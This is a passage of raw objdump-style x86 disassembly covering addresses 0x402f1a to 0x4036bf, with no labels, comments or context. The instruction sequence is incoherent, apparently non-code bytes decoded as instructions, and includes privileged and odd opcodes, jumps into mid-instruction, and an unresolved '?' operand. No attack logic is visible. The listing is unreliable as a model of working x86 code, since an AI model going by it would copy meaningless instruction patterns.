  402f1a:	sbb    BYTE PTR [ebx+0x0],0xd1
  402f1e:	add    BYTE PTR [eax+0x1902c802],al
  402f24:	sbb    BYTE PTR [edx-0x3e],dl
  402f27:	inc    esp
  402f28:	or     BYTE PTR [eax],cl
  402f2a:	rol    BYTE PTR [edx],1
  402f2c:	nop
  402f2d:	and    DWORD PTR [esi],esi
  402f2f:	dec    eax
  402f30:	or     al,0x44
  402f32:	xor    BYTE PTR [esp+ebp*8],al
  402f35:	inc    edx
  402f36:	add    al,0x3
  402f38:	sbb    ah,BYTE PTR [eax]
  402f3a:	cmp    BYTE PTR [ecx],dh
  402f3c:	or     BYTE PTR [ecx+eiz*1],ah
  402f3f:	or     BYTE PTR [ecx],0x44
  402f42:	inc    eax
  402f43:	add    BYTE PTR [edx],ah
  402f45:	adc    DWORD PTR [eax],ebx
  402f47:	push   ds
  402f48:	add    DWORD PTR [eax],0x10180696
  402f4e:	dec    ecx
  402f4f:	dec    eax
  402f50:	inc    edx
  402f51:	daa    
  402f52:	call   DWORD PTR ds:0x43728c
  402f58:	add    al,0xb9
  402f5a:	add    BYTE PTR [esp+esi*1],bl
  402f5d:	icebp  
  402f5e:	inc    edx
  402f5f:	loopne 0x402f86
  402f61:	pusha  
  402f62:	add    BYTE PTR [eax],dl
  402f64:	add    DWORD PTR [eax],ecx
  402f66:	pusha  
  402f67:	add    DWORD PTR [eax+0x16020100],edx
  402f6d:	adc    al,0x40
  402f6f:	add    DWORD PTR [ecx+eax*1+0x20],eax
  402f73:	or     BYTE PTR [eax],al
  402f75:	dec    ecx
  402f76:	pop    eax
  402f77:	adc    BYTE PTR [edx+0x5e],ah
  402f7a:	add    BYTE PTR [eax+0x21],al
  402f7d:	add    BYTE PTR [eax],bl
  402f7f:	and    dl,BYTE PTR [eax+0xd021080]
  402f85:	add    BYTE PTR [ecx+0x354440f8],0x6
  402f8c:	and    DWORD PTR [eax+ecx*1-0x80],eax
  402f90:	or     DWORD PTR [eax],esp
  402f92:	and    BYTE PTR [eax],0x8
  402f95:	or     BYTE PTR [esi],dl
  402f97:	and    bl,BYTE PTR [eax]
  402f99:	push   es
  402f9a:	and    DWORD PTR [ecx+ebx*1],esp
  402f9d:	inc    esp
  402f9e:	add    BYTE PTR ds:0x452a221,ch
  402fa4:	sbb    DWORD PTR [eax],edx
  402fa6:	push   eax
  402fa7:	adc    BYTE PTR [ecx+0x40588a1],cl
  402fad:	or     BYTE PTR [eax+0x63],ah
  402fb0:	and    DWORD PTR [edx],0x50181208
  402fb6:	or     BYTE PTR [esi+0x11a002a9],ch
  402fbc:	add    al,BYTE PTR [edx+0x1c]
  402fbf:	add    al,0x0
  402fc1:	add    BYTE PTR [edx],al
  402fc3:	dec    esi
  402fc4:	and    al,0x22
  402fc6:	adc    eax,eax
  402fc8:	push   0x321102b1
  402fcd:	add    BYTE PTR [eax],dl
  402fcf:	dec    ebx
  402fd0:	or     eax,0x900029
  402fd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fd6:	add    BYTE PTR [ecx],ah
  402fd8:	push   cs
  402fd9:	or     al,0x45
  402fdb:	add    BYTE PTR [edx],cl
  402fdd:	inc    edx
  402fde:	add    al,0x50
  402fe0:	and    BYTE PTR [eax+0x8152060],cl
  402fe6:	and    dl,BYTE PTR [edi]
  402fe8:	or     al,0x22
  402fea:	xor    DWORD PTR [esi],eax
  402fec:	add    DWORD PTR [esp+edx*1],0x80210083
  402ff3:	inc    edx
  402ff4:	adc    BYTE PTR [eax+0x46283801],al
  402ffa:	and    al,0x10
  402ffc:	inc    eax
  402ffd:	add    al,BYTE PTR [ebx]
  402fff:	adc    BYTE PTR [eax],0x8
  403002:	or     DWORD PTR [edx+0x20900930],0x21025585
  40300c:	add    al,0x31
  40300e:	and    al,BYTE PTR [eax]
  403010:	add    al,BYTE PTR [edx+0x2]
  403013:	sub    al,0x84
  403015:	jo     0x403019
  403017:	push   ebp
  403018:	add    BYTE PTR [eax],al
  40301a:	inc    esp
  40301b:	adc    BYTE PTR [ebx],al
  40301d:	or     BYTE PTR [esp+eax*2],al
  403020:	or     ah,BYTE PTR [edx+eax*1]
  403023:	inc    eax
  403024:	add    BYTE PTR [ecx],bl
  403026:	adc    BYTE PTR [esi],ch
  403028:	add    DWORD PTR [eax+ebp*1+0x14c12b01],edx
  40302f:	add    BYTE PTR [ecx+0x448080b],ah
  403035:	or     BYTE PTR [ebx+eax*4+0x558d44],al
  40303c:	add    al,0x32
  40303e:	or     al,0x44
  403040:	sub    BYTE PTR [edx-0x4ddcdaf8],dl
  403046:	add    ah,BYTE PTR [ecx]
  403048:	dec    eax
  403049:	sbb    ah,BYTE PTR [edx]
  40304b:	and    DWORD PTR [eax],0x8654802
  403051:	add    BYTE PTR [esi-0x17],0x0
  403055:	add    al,BYTE PTR [eax]
  403057:	jo     0x403059
  403059:	inc    edx
  40305a:	pusha  
  40305b:	pusha  
  40305c:	add    BYTE PTR [ecx-0x40],ch
  40305f:	add    esp,esi
  403061:	sbb    cl,BYTE PTR [eax+0x52]
  403064:	add    BYTE PTR [ecx],cl
  403066:	inc    esp
  403067:	add    DWORD PTR [eax+0x32],eax
  40306a:	add    cl,BYTE PTR [eax+0x24c44120]
  403070:	xchg   BYTE PTR [eax+0x21],al
  403073:	sbb    BYTE PTR [ecx],cl
  403075:	les    ebx,FWORD PTR [eax+0x20]
  403078:	sub    edx,esp
  40307a:	push   eax
  40307b:	ss test al,0x42
  40307e:	mov    edx,es
  403080:	or     al,0x16
  403082:	popa   
  403083:	add    al,0xc
  403085:	bound  eax,QWORD PTR [ecx]
  403087:	or     al,0x8a
  403089:	adc    BYTE PTR [eax],dh
  40308b:	mov    eax,ds:0xe022094e
  403090:	add    dl,0x0
  403093:	inc    esp
  403094:	lock add al,0x5
  403097:	and    cl,BYTE PTR [eax+ecx*1]
  40309a:	nop
  40309b:	or     BYTE PTR [eax],al
  40309d:	adc    al,0x12
  40309f:	add    BYTE PTR [esi+esi*2],dh
  4030a2:	or     DWORD PTR [eax],ecx
  4030a4:	inc    ebp
  4030a5:	add    DWORD PTR ds:0x2419f743,0x8311080
  4030af:	add    BYTE PTR [ecx],ah
  4030b1:	or     BYTE PTR [eax+ecx*4],cl
  4030b4:	add    DWORD PTR [ebx],eax
  4030b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030b7:	push   0x964b9111
  4030bc:	mov    WORD PTR [eax],ds
  4030be:	sub    BYTE PTR [edx],al
  4030c0:	or     BYTE PTR [edx+0x28c340c0],bl
  4030c6:	add    WORD PTR [edi],0xf90
  4030cb:	inc    esi
  4030cc:	pop    eax
  4030cd:	ins    DWORD PTR es:[edi],dx
  4030ce:	dec    ecx
  4030cf:	push   es
  4030d0:	pushf  
  4030d1:	or     al,0x10
  4030d3:	or     al,0xcb
  4030d5:	mov    eax,ds:0x43225088
  4030da:	or     BYTE PTR [edx],al
  4030dc:	inc    eax
  4030dd:	add    DWORD PTR [eax+0x41068004],esp
  4030e3:	add    al,0x40
  4030e5:	push   cs
  4030e6:	xchg   esp,eax
  4030e7:	mov    WORD PTR [eax],es
  4030e9:	add    DWORD PTR [eax+eax*4+0x44840040],ebx
  4030f0:	add    dh,BYTE PTR [edx]
  4030f2:	and    DWORD PTR [ecx+eax*1],esp
  4030f5:	add    DWORD PTR [eax],edx
  4030f7:	push   eax
  4030f8:	test   DWORD PTR ds:0x738886a,ecx
  4030fe:	mov    BYTE PTR ds:0x98284203,al
  403104:	and    eax,0x18902049
  403109:	adc    ah,BYTE PTR [eax+eax*1]
  40310c:	cmp    DWORD PTR [eax+0x24],0x21191a08
  403113:	adc    al,BYTE PTR [eax]
  403115:	or     dl,BYTE PTR [eax]
  403117:	and    esp,edx
  403119:	add    DWORD PTR ds:0x1008d803,eax
  40311f:	dec    edx
  403120:	xor    dl,BYTE PTR [ecx]
  403122:	nop
  403123:	add    eax,0xa241a
  403128:	test   BYTE PTR [eax+0x11],al
  40312b:	add    BYTE PTR [eax],ah
  40312d:	mov    WORD PTR [eax+0x1],ss
  403130:	add    BYTE PTR [eax],al
  403132:	test   BYTE PTR [eax],al
  403134:	add    al,0x49
  403136:	adc    BYTE PTR [edx+0x14],cl
  403139:	and    DWORD PTR [eax],0x10310286
  40313f:	or     BYTE PTR [eax],dl
  403141:	inc    edx
  403142:	sbb    dl,al
  403144:	and    al,0x9
  403146:	and    BYTE PTR [edx+esi*1+0x4801004b],al
  40314d:	inc    esp
  40314e:	add    dh,ah
  403150:	add    DWORD PTR [eax],ecx
  403152:	add    BYTE PTR [eax+eax*1+0x2253e000],al
  403159:	or     DWORD PTR [eax-0x50],edx
  40315c:	mov    BYTE PTR [eax],ah
  40315e:	and    BYTE PTR [eax],dl
  403160:	add    DWORD PTR [eax],0x1000d00
  403166:	adc    al,0x70
  403168:	push   eax
  403169:	add    BYTE PTR [eax+ecx*2],dl
  40316c:	pop    es
  40316d:	mov    DWORD PTR [eax],eax
  40316f:	dec    ecx
  403170:	adc    ebp,DWORD PTR [eax]
  403172:	xchg   edx,eax
  403173:	push   es
  403174:	loopne 0x403199
  403176:	adc    DWORD PTR [ecx],ecx
  403178:	or     BYTE PTR [eax+eax*1-0x77757fbc],al
  40317f:	push   eax
  403180:	leave  
  403181:	jo     0x4031cd
  403183:	add    ah,0x1
  403186:	add    al,0xcc
  403188:	adc    BYTE PTR [edx],al
  40318a:	add    ah,BYTE PTR [ecx+0x44]
  40318d:	add    BYTE PTR [eax],0x20
  403190:	sub    DWORD PTR [ebx+edx*1],edx
  403193:	jno    0x40313b
  403195:	pop    es
  403196:	adc    al,0x40
  403198:	or     bh,BYTE PTR [edx+0x92]
  40319e:	bound  edx,QWORD PTR ds:0xc2308022
  4031a4:	test   BYTE PTR [edx+0x48],dh
  4031a7:	pusha  
  4031a8:	inc    ecx
  4031a9:	xchg   esp,eax
  4031aa:	add    DWORD PTR [edi],ecx
  4031ac:	add    BYTE PTR [esi+0x4000c2],al
  4031b2:	add    eax,0xa984852
  4031b7:	or     al,0xe
  4031b9:	xor    DWORD PTR [ecx],eax
  4031bb:	push   eax
  4031bc:	inc    ecx
  4031bd:	add    BYTE PTR [eax-0x7b7e5dfb],cl
  4031c3:	add    BYTE PTR [eax],al
  4031c5:	pop    edx
  4031c6:	adc    BYTE PTR [eax+0x40],0x54
  4031ca:	push   esp
  4031cb:	dec    esp
  4031cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031cd:	add    BYTE PTR [eax+eax*8],0x48
  4031d1:	add    BYTE PTR [edx],al
  4031d3:	inc    esp
  4031d4:	and    BYTE PTR [ecx+0xa],al
  4031d7:	add    al,BYTE PTR [eax]
  4031d9:	add    BYTE PTR [eax],0x86
  4031dc:	sbb    al,BYTE PTR [edx-0x553ed277]
  4031e2:	mov    BYTE PTR [esp+eax*8],cl
  4031e5:	and    DWORD PTR [ecx+eax*2],esp
  4031e8:	rcr    eax,0x0
  4031eb:	push   edx
  4031ec:	inc    edx
  4031ed:	add    BYTE PTR [eax],cl
  4031ef:	mov    WORD PTR [ecx],fs
  4031f1:	add    al,0x10
  4031f3:	or     al,BYTE PTR [eax+eiz*1]
  4031f6:	add    al,BYTE PTR [eax]
  4031f8:	and    BYTE PTR [eax],ah
  4031fa:	xchg   BYTE PTR [esi],dl
  4031fc:	add    BYTE PTR [eax],ch
  4031fe:	mov    BYTE PTR [eax+0x8],ch
  403201:	dec    edx
  403202:	les    esi,FWORD PTR [edx+0x42808020]
  403208:	inc    eax
  403209:	or     BYTE PTR [eax+0x1289d25],ch
  40320f:	mov    al,0x81
  403211:	xor    al,0x14
  403213:	mov    al,dl
  403215:	add    BYTE PTR [eax],dl
  403217:	adc    BYTE PTR [esi+0x27],0x8
  40321b:	xor    ah,BYTE PTR [eax+0x52210a6d]
  403221:	or     BYTE PTR [ebx-0x7cf4dfef],ah
  403227:	adc    al,BYTE PTR [eax-0x74]
  40322a:	mov    dl,BYTE PTR fs:[eax]
  40322d:	mov    DWORD PTR [ecx],ebp
  40322f:	add    BYTE PTR [eax],al
  403231:	add    DWORD PTR [ebx+0x20442c38],eax
  403237:	pusha  
  403238:	or     BYTE PTR [eax],cl
  40323a:	or     BYTE PTR [esi+0x25044111],dl
  403240:	adc    BYTE PTR [edx+0x1808082],al
  403246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403247:	adc    al,0x2
  403249:	popf   
  40324a:	mov    eax,ds:0x80822156
  40324f:	xchg   esp,eax
  403250:	mov    eax,ss:0x48032382
  403256:	sbb    BYTE PTR [eax],al
  403258:	nop
  403259:	inc    ecx
  40325a:	or     ch,BYTE PTR es:[ecx]
  40325d:	add    BYTE PTR [ecx+eax*1-0x739bfe58],cl
  403264:	or     DWORD PTR [eax+eiz*1],ebp
  403267:	add    ecx,DWORD PTR [eax+0x80888]
  40326d:	mov    BYTE PTR [edx],dl
  40326f:	nop
  403270:	js     0x40321a
  403272:	inc    eax
  403273:	and    BYTE PTR [eax-0x3befdff7],dl
  403279:	test   eax,0x2842048a
  40327e:	adc    cl,BYTE PTR [eax]
  403280:	push   es
  403281:	jno    0x403205
  403283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403284:	add    BYTE PTR [ecx+0x10],dl
  403287:	test   BYTE PTR [edx+eiz*1],ah
  40328a:	xchg   BYTE PTR [eax],ah
  40328c:	jbe    0x403240
  40328e:	add    BYTE PTR [eax],al
  403290:	adc    cl,BYTE PTR [edx+0x61]
  403293:	jo     0x4032ae
  403295:	retf   0x2228
  403298:	mov    BYTE PTR [eax+eax*1],dh
  40329b:	add    ecx,eax
  40329d:	add    dl,BYTE PTR [eax-0x60]
  4032a0:	mov    al,ds:0xd60e1d
  4032a5:	add    BYTE PTR [eax],cl
  4032a7:	lds    eax,FWORD PTR [eax]
  4032a9:	inc    eax
  4032aa:	mov    al,ds:0x20008203
  4032af:	adc    BYTE PTR [eax+eiz*1],cl
  4032b2:	add    BYTE PTR [ecx],dl
  4032b4:	and    bl,cl
  4032b6:	fs xchg ebx,eax
  4032b8:	or     al,BYTE PTR ds:0x88300
  4032be:	add    BYTE PTR [esi+0x60],cl
  4032c1:	and    al,0xc8
  4032c3:	pop    ss
  4032c4:	add    DWORD PTR [eax+0x48200063],ecx
  4032ca:	nop
  4032cb:	add    BYTE PTR [edx],cl
  4032cd:	push   eax
  4032ce:	mov    BYTE PTR [eax],0x9
  4032d1:	sub    BYTE PTR [eax],al
  4032d3:	and    al,BYTE PTR [eax+eax*2]
  4032d6:	add    BYTE PTR [edx+0x24004306],al
  4032dc:	add    BYTE PTR [edi+0x20],0xc8
  4032e0:	inc    eax
  4032e1:	mov    al,ds:0x34238980
  4032e6:	inc    ecx
  4032e7:	inc    esp
  4032e8:	mov    DWORD PTR [edx],edx
  4032ea:	mov    dl,BYTE PTR [esp+edi*4+0x58403c8]
  4032f1:	inc    ebp
  4032f2:	shr    BYTE PTR [eax+0x42],0x0
  4032f6:	rcl    DWORD PTR [eax-0x4f],0x0
  4032fa:	rcl    BYTE PTR [eax+0x2102010],0x90
  403301:	sub    eax,DWORD PTR [edx]
  403303:	add    BYTE PTR [ecx+0x0],0x1
  403307:	inc    edx
  403308:	and    DWORD PTR [eax+0x9240080],eax
  40330e:	add    DWORD PTR [esi-0x6f],eax
  403311:	cmp    al,BYTE PTR [ecx-0x6ffffb3f]
  403317:	pop    es
  403318:	add    edx,eax
  40331a:	test   eax,0x15061800
  40331f:	or     DWORD PTR [eax+0x0],eax
  403322:	push   edx
  403323:	adc    eax,0x80049205
  403328:	and    BYTE PTR [ebp+esi*1+0x2a00190],al
  40332f:	pop    eax
  403330:	or     ebp,esi
  403332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403333:	rol    BYTE PTR [edx+eiz*2],0x1
  403337:	sub    DWORD PTR [eax],edx
  403339:	cmp    BYTE PTR [ecx],0xa6
  40333c:	push   ss
  40333d:	and    DWORD PTR [ecx],eax
  40333f:	add    BYTE PTR [ebx+eax*1],ah
  403342:	sub    BYTE PTR [eax],al
  403344:	add    DWORD PTR [edx],0x82302081
  40334a:	adc    BYTE PTR [ebp+0x94001d0],ah
  403350:	add    al,BYTE PTR [eax]
  403352:	and    al,0x4
  403354:	adc    BYTE PTR [edx],dl
  403356:	nop
  403357:	add    BYTE PTR [ecx+esi*1],dl
  40335a:	sbb    al,BYTE PTR [edx-0x2bff6fa8]
  403360:	add    BYTE PTR [eax+0xa],cl
  403363:	and    DWORD PTR [ecx+esi*1],eax
  403366:	and    eax,0x8005403
  40336b:	add    DWORD PTR [edx+0x6a119448],eax
  403371:	and    BYTE PTR [eax+esi*4],cl
  403374:	mov    eax,ds:0x80027402
  403379:	add    al,0xc0
  40337b:	inc    ebp
  40337c:	mov    al,ds:0xb408406c
  403381:	add    BYTE PTR [edx],dl
  403383:	add    BYTE PTR [edx],ch
  403385:	or     BYTE PTR [eax],al
  403387:	and    BYTE PTR [ecx],cl
  403389:	add    al,0x18
  40338b:	int3   
  40338c:	push   esi
  40338d:	cmp    ah,BYTE PTR [eax+0x24504008]
  403393:	add    BYTE PTR [edx],al
  403395:	rcl    BYTE PTR [eax],0x83
  403398:	jmp    0x8dcd99d
  40339d:	sbb    DWORD PTR [edx],eax
  40339f:	add    eax,ecx
  4033a1:	dec    eax
  4033a2:	add    DWORD PTR [edx+0x23],eax
  4033a5:	push   es
  4033a6:	inc    esp
  4033a7:	cs or  al,0x1
  4033aa:	ret    
  4033ab:	add    al,BYTE PTR [eax]
  4033ad:	pusha  
  4033ae:	adc    BYTE PTR [ecx],0x44
  4033b1:	adc    DWORD PTR [eax],eax
  4033b3:	add    edx,DWORD PTR [eax]
  4033b5:	dec    eax
  4033b6:	push   es
  4033b7:	or     BYTE PTR [ecx+0x66],dl
  4033ba:	push   esi
  4033bb:	add    DWORD PTR [edx],0x4
  4033be:	leave  
  4033bf:	add    al,0x4c
  4033c1:	inc    esp
  4033c2:	and    al,0x9
  4033c4:	repnz adc BYTE PTR [eax],ch
  4033c7:	pop    es
  4033c8:	pusha  
  4033c9:	lock adc dh,BYTE PTR [edx-0x7bf7bdba]
  4033d0:	sub    DWORD PTR [ecx+0x20006],ebx
  4033d6:	pop    ecx
  4033d7:	cmp    DWORD PTR [eax*4+0x52004610],ebp
  4033de:	loop   0x4033cd
  4033e0:	test   BYTE PTR [eax],cl
  4033e2:	adc    DWORD PTR [edx],eax
  4033e4:	push   ss
  4033e5:	mov    al,0xa
  4033e7:	and    BYTE PTR [ecx],al
  4033e9:	push   0x2c
  4033eb:	or     BYTE PTR [eax],al
  4033ed:	add    BYTE PTR [ebp+0x0],bl
  4033f0:	and    BYTE PTR [ecx+edx*1+0x0],0x11
  4033f5:	inc    eax
  4033f6:	add    dl,0x45
  4033f9:	or     al,BYTE PTR [eax]
  4033fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033fc:	dec    eax
  4033fd:	add    BYTE PTR [ebx],ch
  4033ff:	call   0x802b:0x40db1001
  403406:	or     al,BYTE PTR es:[eax+edx*1+0x40200900]
  40340e:	add    DWORD PTR [esi],0xa3090000
  403414:	adc    BYTE PTR [eax-0x17f78fff],0x10
  40341b:	add    BYTE PTR [eax+eax*1],cl
  40341e:	push   eax
  40341f:	jae    0x4033a1
  403421:	cdq    
  403422:	mov    al,ds:0xb082951
  403427:	and    dh,BYTE PTR [edx+0x4e]
  40342a:	add    BYTE PTR [eax+eiz*1+0x68],al
  40342e:	test   BYTE PTR [eax],al
  403430:	and    BYTE PTR [eax],dl
  403432:	adc    BYTE PTR [eax],al
  403434:	add    al,0x80
  403436:	or     BYTE PTR [eax-0x5f6b30f6],dl
  40343c:	add    BYTE PTR [edx+0x10],al
  40343f:	pop    esp
  403440:	pushf  
  403441:	adc    eax,0x41810408
  403446:	add    BYTE PTR [ebx],al
  403448:	add    al,0x82
  40344a:	add    esi,DWORD PTR [esi+0x42]
  40344d:	sbb    DWORD PTR [eax],eax
  40344f:	sub    BYTE PTR [eax],ah
  403451:	add    BYTE PTR [eax],al
  403453:	pusha  
  403454:	nop
  403455:	test   al,0x44
  403457:	fld    DWORD PTR [eax]
  403459:	add    eax,0x8466e509
  40345e:	dec    eax
  40345f:	add    BYTE PTR [eax],0x44
  403462:	sbb    DWORD PTR [eax+0x20901047],edx
  403468:	push   es
  403469:	inc    esp
  40346a:	inc    ecx
  40346b:	les    eax,FWORD PTR [eax-0x1b]
  40346e:	and    BYTE PTR [ecx],ch
  403470:	or     DWORD PTR [ecx],eax
  403472:	and    DWORD PTR [eax],edx
  403474:	or     al,0x98
  403476:	mov    ?,WORD PTR [eax]
  403478:	inc    esi
  403479:	sbb    BYTE PTR [eax],cl
  40347b:	push   0x2
  40347d:	and    DWORD PTR [eax-0x7bfbf3d0],ecx
  403483:	and    DWORD PTR [eax],edi
  403485:	es pusha 
  403487:	inc    edx
  403488:	call   0x8021:0xa32882b6
  40348f:	and    BYTE PTR [ebx-0x5e],cl
  403492:	add    al,BYTE PTR [ebp+0x3]
  403495:	xchg   edx,eax
  403496:	in     al,dx
  403497:	add    BYTE PTR [edx+edx*1+0x53],ch
  40349b:	inc    esp
  40349c:	adc    DWORD PTR [ecx],eax
  40349e:	dec    edx
  40349f:	add    BYTE PTR [eax+0x1a08004],ch
  4034a5:	add    BYTE PTR [eax+edx*4+0x51],cl
  4034a9:	push   es
  4034aa:	or     BYTE PTR [ecx-0x67],cl
  4034ad:	or     DWORD PTR [edx+0x60b8809],eax
  4034b3:	add    BYTE PTR [esi],al
  4034b5:	inc    eax
  4034b6:	adc    edx,DWORD PTR [eax]
  4034b8:	adc    DWORD PTR [ecx+0x67200000],ebp
  4034be:	adc    esp,DWORD PTR [eax]
  4034c0:	sub    DWORD PTR [ecx],eax
  4034c2:	and    al,al
  4034c4:	add    BYTE PTR [edx+0x28],0xb8
  4034c8:	sub    BYTE PTR [edi+eax*1],cl
  4034cb:	inc    eax
  4034cc:	sub    eax,0x2e0420a0
  4034d1:	mov    al,ds:0x90000c02
  4034d6:	or     bl,BYTE PTR [ecx+0x8]
  4034d9:	stos   BYTE PTR es:[edi],al
  4034da:	bound  eax,QWORD PTR [ebx-0x7fbe0000]
  4034e0:	ss fwait
  4034e2:	add    cl,BYTE PTR [eax+esi*2+0x2068e0]
  4034e9:	mov    BYTE PTR ds:0x44c86088,bl
  4034ef:	jo     0x403559
  4034f1:	or     ah,BYTE PTR [eax]
  4034f3:	and    BYTE PTR [esi],dh
  4034f5:	add    cl,BYTE PTR fs:[ecx]
  4034f8:	adc    BYTE PTR [eax-0x2d7fe0fe],ch
  4034fe:	inc    eax
  4034ff:	pop    es
  403500:	or     DWORD PTR [edx],eax
  403502:	rol    DWORD PTR [eax],0x41
  403505:	adc    BYTE PTR [eax],bl
  403507:	adc    al,BYTE PTR [eax+0x40]
  40350a:	or     dl,BYTE PTR [eax+0xa2501a0]
  403510:	add    BYTE PTR cs:[eax],al
  403513:	add    BYTE PTR [eax+0x130802],0x22
  40351a:	sar    BYTE PTR [edx],0x0
  40351d:	add    DWORD PTR [eax+0x2d000401],eax
  403523:	or     BYTE PTR [edx],al
  403525:	nop
  403526:	and    esp,DWORD PTR [eax+0x18]
  403529:	xor    BYTE PTR [eax+esi*2+0x32c40228],0x61
  403531:	nop
  403532:	inc    eax
  403533:	inc    esp
  403534:	dec    eax
  403535:	add    BYTE PTR [ecx+eax*1],cl
  403538:	loope  0x4034ce
  40353a:	loopne 0x40354c
  40353c:	dec    ecx
  40353d:	adc    al,ah
  40353f:	add    BYTE PTR [ecx],dl
  403541:	add    al,BYTE PTR [eax+0x12084406]
  403547:	inc    edx
  403548:	inc    ebx
  403549:	dec    eax
  40354a:	inc    esp
  40354b:	adc    al,0x96
  40354d:	push   0x88045142
  403552:	mov    BYTE PTR [esi],al
  403554:	xor    al,BYTE PTR [eax]
  403556:	test   DWORD PTR [edx+edx*2],ebp
  403559:	add    ch,BYTE PTR [eax]
  40355b:	add    al,0x1
  40355d:	or     dl,BYTE PTR [ecx]
  40355f:	and    BYTE PTR [eax+0x2],al
  403562:	xor    BYTE PTR [eax],0x0
  403565:	bound  edx,QWORD PTR [edx]
  403567:	loop   0x4035c3
  403569:	retf   
  40356a:	add    BYTE PTR [ebx-0x3f],al
  40356d:	daa    
  40356e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40356f:	cmp    BYTE PTR [esi],ch
  403571:	push   ss
  403572:	mov    al,ds:0x6012808c
  403577:	or     BYTE PTR [eax+eiz*1+0x310880c4],al
  40357e:	inc    eax
  40357f:	add    DWORD PTR [ecx-0x3fcaff78],edx
  403585:	inc    esp
  403586:	add    BYTE PTR [eax],cl
  403588:	or     eax,0x9b120221
  40358d:	inc    edx
  40358e:	add    BYTE PTR es:[eax+ebp*1],al
  403592:	add    DWORD PTR [eax],eax
  403594:	les    esp,FWORD PTR [eax]
  403596:	add    BYTE PTR [edx+0x420011c4],ch
  40359c:	and    cl,BYTE PTR [eax+ecx*1]
  40359f:	xchg   dh,dl
  4035a1:	inc    ebp
  4035a2:	inc    eax
  4035a3:	rcr    BYTE PTR [eax],0x62
  4035a6:	xor    BYTE PTR [ecx],al
  4035a8:	add    BYTE PTR [eax+0x41900405],dl
  4035ae:	dec    eax
  4035af:	mov    ds:0xc1406000,al
  4035b4:	adc    BYTE PTR fs:[eax],cl
  4035b7:	sub    BYTE PTR [eax],al
  4035b9:	add    al,BYTE PTR [eax]
  4035bb:	inc    ecx
  4035bc:	add    DWORD PTR [eax-0x5c],edx
  4035bf:	add    BYTE PTR [ecx],al
  4035c1:	xor    esi,edx
  4035c3:	push   esp
  4035c4:	add    BYTE PTR [eax],0x4
  4035c7:	add    BYTE PTR [ecx],ah
  4035c9:	sbb    al,BYTE PTR [eax+0x60]
  4035cc:	xor    DWORD PTR [eax+0x50],eax
  4035cf:	inc    edx
  4035d0:	and    BYTE PTR [edx],al
  4035d2:	add    BYTE PTR [eax+0x35],cl
  4035d5:	int3   
  4035d6:	add    BYTE PTR [eax-0x7c],ch
  4035d9:	add    ah,BYTE PTR [eax]
  4035db:	add    al,0x83
  4035dd:	adc    eax,0x89002084
  4035e2:	add    BYTE PTR [edx+0x12],cl
  4035e5:	dec    eax
  4035e6:	xchg   ebp,eax
  4035e7:	shl    DWORD PTR [edx+0x4],0xa0
  4035eb:	add    al,0x1
  4035ed:	or     edx,DWORD PTR [eax]
  4035ef:	add    al,0x81
  4035f1:	or     al,BYTE PTR [eax+0x48081165]
  4035f7:	add    BYTE PTR ds:0xa424200,cl
  4035fd:	mov    DWORD PTR [ecx],ecx
  4035ff:	rcl    BYTE PTR [eax],0x11
  403602:	add    al,BYTE PTR [ebx]
  403604:	add    eax,DWORD PTR [ecx+0x4800000]
  40360a:	add    BYTE PTR [ecx+eiz*1-0x80],al
  40360e:	sub    ah,BYTE PTR [ebx+0xa8380]
  403614:	add    al,BYTE PTR [edx]
  403616:	add    eax,0x54015de0
  40361b:	dec    eax
  40361c:	add    BYTE PTR [eax],al
  40361e:	add    BYTE PTR [ecx+0x10910080],dl
  403624:	or     ah,BYTE PTR [ebx+0x40]
  403627:	pop    es
  403628:	pop    eax
  403629:	add    BYTE PTR [eax],al
  40362b:	add    BYTE PTR [eax+0x33052106],al
  403631:	inc    edx
  403632:	add    al,0x46
  403634:	mov    ds:0x10620220,al
  403639:	adc    BYTE PTR [edi],dl
  40363b:	inc    eax
  40363c:	sub    BYTE PTR [eax],al
  40363e:	add    DWORD PTR [edx],ebp
  403640:	cwde   
  403641:	sub    BYTE PTR [eax-0x70],dl
  403644:	adc    al,0x31
  403646:	pusha  
  403647:	inc    eax
  403648:	add    BYTE PTR [esp+ecx*1+0xc],dl
  40364c:	inc    ecx
  40364d:	add    al,0xc4
  40364f:	add    BYTE PTR [eax],al
  403651:	inc    eax
  403652:	and    eax,0xd144c544
  403657:	add    al,0x20
  403659:	test   eax,0xbd00c104
  40365e:	sub    BYTE PTR [eax],0xe
  403661:	or     BYTE PTR [eax],al
  403663:	loop   0x4035f7
  403665:	and    BYTE PTR [edx],0xa0
  403668:	or     BYTE PTR [edx+eax*4],dl
  40366b:	or     BYTE PTR [eax+0x2e],al
  40366e:	inc    eax
  40366f:	nop
  403670:	add    DWORD PTR [ecx],ebp
  403672:	or     BYTE PTR [edi],0x48
  403675:	add    ah,BYTE PTR [eax]
  403677:	bound  eax,QWORD PTR [eax]
  403679:	add    cl,ah
  40367b:	and    al,0x12
  40367d:	add    DWORD PTR [esi],eax
  40367f:	mov    ah,0x81
  403681:	xor    DWORD PTR [edi-0x40],eax
  403684:	int3   
  403685:	jo     0x4036e7
  403687:	imul   esp,DWORD PTR [ebx],0x8281004
  40368d:	add    bl,BYTE PTR [eax]
  40368f:	and    DWORD PTR [esi],ecx
  403691:	cdq    
  403692:	sub    DWORD PTR [eax],0x242100
  403698:	ret    0x5381
  40369b:	add    dh,BYTE PTR [eax]
  40369d:	inc    edx
  40369e:	and    BYTE PTR [eax+ebx*1],dl
  4036a1:	xor    DWORD PTR [eax],edx
  4036a3:	pop    es
  4036a4:	and    DWORD PTR [eax],eax
  4036a6:	push   ebx
  4036a7:	or     bl,al
  4036a9:	mov    eax,ds:0x1128ca10
  4036ae:	xchg   edx,eax
  4036af:	popa   
  4036b0:	add    BYTE PTR [ecx+ebp*2+0x8],ch
  4036b4:	add    dl,BYTE PTR [ebx]
  4036b6:	rol    BYTE PTR [eax],cl
  4036b8:	add    DWORD PTR [eax],edx
  4036ba:	cmp    DWORD PTR [ebp-0x38],ebp
  4036bd:	add    eax,DWORD PTR [edx]
  4036bf:	add    eax,DWORD PTR [eax]
